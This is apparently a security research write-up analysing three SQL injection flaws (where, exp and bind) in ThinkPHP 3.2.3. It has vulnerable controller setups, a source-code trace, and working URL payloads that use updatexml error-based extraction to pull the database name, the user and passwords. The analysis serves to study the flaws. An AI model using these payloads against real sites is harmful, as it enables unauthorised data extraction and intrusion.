# ThinkPHP3.2.x SQL Injection

Author: H3rmesk1t

Data: 2021.08.03

# Initial configuration
- Here we use `ThinkPHP3.2.3` as an example, [click here to download](http://www.thinkphp.cn/donate/download/id/610.html)
- [Summary of common methods in ThinkPHP: M method, D method, U method, I method] (https://www.cnblogs.com/kenshinobiy/p/9165662.html)
## Database Configuration
- Database related content configuration, file location `Application/Home/Conf/config.php`

```php
<?php
return array(
    //'Configuration Item'=>'Configuration Value'
    //Database configuration information
    'DB_TYPE' ='mysql', // Database type
    'DB_HOST' ='localhost', // Server address
    'DB_NAME' ='cms', // Database name
    'DB_USER' ='cms', // Username
    'DB_PWD' ='20010728', // Password
    'DB_PORT' =3306, // Port
    'DB_PARAMS' = array(), // Database connection parameters
    'DB_PREFIX' ='', // Database table prefix
    'DB_CHARSET'='utf8', // Character set
    'DB_DEBUG' = TRUE, // Database debugging mode can record SQL logs after being turned on
);
```
## where injection controller configuration
Controller configuration, file location `Application/Home/Controller/IndexController.class.php`

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "Microsoft Yahei"; color: #333;font-size: 24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>Welcome to <b>ThinkPHP</b>! </p><br/> Version V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
        $data = M('users')->find(I('GET.id'));
        var_dump($data);
    }
}
```
## exp injection controller configuration

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "Microsoft Yahei"; color: #333;font-size: 24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>Welcome to <b>ThinkPHP</b>! </p><br/> Version V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
        $User = D('Users');
        $map = array('user' =$_GET['user']);
        $user = $User->where($map)->find();
        var_dump($user);
    }
}
```
## bind injection controller configuration

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "Microsoft Yahei"; color: #333;font-size: 24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>Welcome to <b>ThinkPHP</b>! </p><br/> Version V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
        $User = M("Users");
        $user['user_id'] = I('id');
        $data['last_name'] = I('last_name');
        $valu = $User->where($user)->save($data);
        var_dump($valu);
    }
}
```
# Vulnerability Exploit
## where injection
Payload: `http://127.0.0.1/cms/?id[where]=1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)#`

![Insert the picture description here](https://img-blog.csdnimg.cn/c0ee9d1456f54adc8ee666329f6821a1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
##
exp injection

Payload: `http://127.0.0.1/cms/index.php/Home/Index/index?user[0]=exp&user[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)`

![Insert the picture description here](https://img-blog.csdnimg.cn/22748af5f7d2462fad965ab20ecba9b8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## bind injection

Payload: `http://127.0.0.1/cms/index.php/Home/Index/index?id[0]=bind&id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&last_name=1`

![Insert the picture description here](https://img-blog.csdnimg.cn/71273db9cc5f42b58ab93f5b60138952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# Vulnerability Analysis
## where injection

From the official documentation, we can know that if the `I()` method does not have filtering parameters, the `htmlspecialchars` method will be used by default for filtering, but the `htmlspecialchars` function used by default does not filter `'`.

Follow up on `ThinkPHP/Common/functions.php`. If `$filters` does not exist, it is equivalent to `C('DEFAULT_FILTER')` and the value is equal to `htmlspecialchars`. Then use the callback function `array_map_recursive` to filter the data.

![Insert the picture description here](https://img-blog.csdnimg.cn/6029f45a8dd546839280e90ab37a7bd6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Continue to go down, use `array_walk_recursive` later. If the input data is an array, call back `think_filter` for further data filtering.

![Insert the picture description here](https://img-blog.csdnimg.cn/64d940427172465d96eccb9667aa3ca9.png#pic_center)

Follow up on the `think_filter` method. If the data passed in is one of the following arrays, add a space after it.

![Insert the picture description here](https://img-blog.csdnimg.cn/eb5dad10e37b4f5ab52528038fb2c6c3.png#pic_center)

Enter the `find` method and follow up `ThinkPHP/Library/Think/Model.class.php`, because we are passing in an array, and the `$pk` value is not an array, so we can directly bypass the previous preset bit to `_parseOptions`

![Insert the picture description here](https://img-blog.csdnimg.cn/72062c57c50b4858a382784189e1c355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the `_parseOptions` method and locate the `_parseType`

![Insert the picture description here](https://img-blog.csdnimg.cn/d5c5d9006772473697dc5de1fc84d23d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the `_parseType` method and found that the data is forced to convert, and then returned to `_parseOptions`. The data is forced to convert, and then put back. After the data type conversion, there is naturally no SQL injection, so it is necessary to bypass the filtering of this function. Go back to the previous step and find that only after the judgment of `if(isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) ` will enter the `_parseType` function filtering. Here you can use an array to bypass it.

![Insert the picture description here](https://img-blog.csdnimg.cn/29a268633ce1421188ad3e7a5322c05d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Continue down and enter the `select` method

![Insert the picture description here](https://img-blog.csdnimg.cn/d0aca678f44b4d1cac45b055768e74a3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on `ThinkPHP/Library/Think/Db/Driver.class.php` and locate the `buildSelectSql` method

![Insert the picture description here](https://img-blog.csdnimg.cn/1174f83347d3453d94fb7affcf6ce417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the `buildSelectSql` method and locate the `parseSql` method

![Insert the picture description here](https://img-blog.csdnimg.cn/f9b2d325d5bb4606a0fc0567b1636302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
Enter the `parseSql` method, take out the corresponding value from the `$options` array and splice it into the sql statement after processing it relative. The direct execution leads to the sql injection vulnerability. Any one-dimensional array can bypass the previous limit, but payload uses `id[where]`, because only the corresponding array key value will be fetched.

![Insert the picture description here](https://img-blog.csdnimg.cn/31ad2bd8960b4ad492a9abcbcac51fca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The spliced ​​statement is

````bas
SELECT * FROM `users` WHERE 1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)# LIMIT 1
```

There are some payloads available here

````bas
?id[group]=1
and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
?id[field]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
```


## exp injection

The `find` method is also used for querying, but it is obvious that the value passed in is an array from the beginning, and the native GET is used here to transfer data instead of the `I()` method provided by thinkphp. The reason is that to successfully inject the exp parameter, the exp parameter must be passed. In the above analysis of the `I()` method is found that the array will be filtered by default, and there is exp. If the exp is followed by spaces, the injection will fail.

First, follow up on the `where` method in `ThinkPHP/Library/Think/Model.class.php`, because `$where` is an array and the entire where method actually does not have any special operations on the array. It just ends up assigning the `$where` array to the `$options` array.

![Insert the picture description here](https://img-blog.csdnimg.cn/3baa79bdec8e4343853d809420a28a50.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the `find` method, which is the same as before, and will not filter the array. Just look at the core `select`, follow up to the `parseSql` method in `ThinkPHP/Library/Think/Db/Driver.class.php`, and enter the `parseWhere` method.

![Insert the picture description here](https://img-blog.csdnimg.cn/84586778d58a492db457283b2b41e091.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The value `$where` passed in when using payload is:

````bas
array(1) {
  ["user"]=>
  array(2) {
    [0]=>
    string(3) "exp"
    [1]=>
    string(46) "=1 and updatexml(1,concat(0x7e,user(),0x7e),1)"
  }
}
```

After analysis, it is found that you will finally enter the `parseWhereItem` method. In the elseif statement of `exp`, the where condition is directly spliced ​​with dots. To satisfy `$val` is an array, and the index of 0 is the string `exp`, you can splice the SQL statement, so you can pass `user[0]=exp&user[1]==1 and xxxxxx` to cause SQL injection

![Insert the picture description here](https://img-blog.csdnimg.cn/9437930a803646f2a246536b85e6c645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## bind injection

When analyzing the exp injection, not only did there be problems with exp, but also bind also had problems. However, here, the `:` symbol will be added in front of `$val[1]`, causing SQL injection to fail.

![Insert the picture description here](https://img-blog.csdnimg.cn/e7d4d342a43a4eb396471fc21a0f90f6.png#pic_center)

Enter the `save` method, follow up `ThinkPHP/Library/Think/Model.class.php`, and locate the `update` method

![Insert the picture description here](https://img-blog.csdnimg.cn/5cd4c3307e7c42e2ac951fe6842ba45b.png#pic_center)

Following up on the `update` method in `ThinkPHP/Library/Think/Db/Driver.class.php`, we found that it also called the `parseWhere` method. Combined with the previous analysis of exp injection, it is guessed that there should be bind injection, but there is a `:` blocking the injection.

![Insert the picture description here](https://img-blog.csdnimg.cn/4abdb7b21aa24b89b2c452e070595bba.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
Follow up on the `execute` method and see how to deal with this `:`

![Insert the picture description here](https://img-blog.csdnimg.cn/45d5280b5e674dcd876e64b6f7750f7d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/1b7ee18ec1714714bb84da68d6b6f7ef.png#pic_center)

- Perform a replacement operation, replace `:0` with a string passed in from outside, so let the incoming parameter equal to 0, so a `:0` is spliced, and then it will be replaced with 1 through `strtr`
- Here is the replacement of `:0` with a string passed in from outside. So our payload, we must fill in `0` to eliminate `:`

# Reference article
 - [Thinkphp3 vulnerability summary](https://y4er.com/post/thinkphp3-vuln/)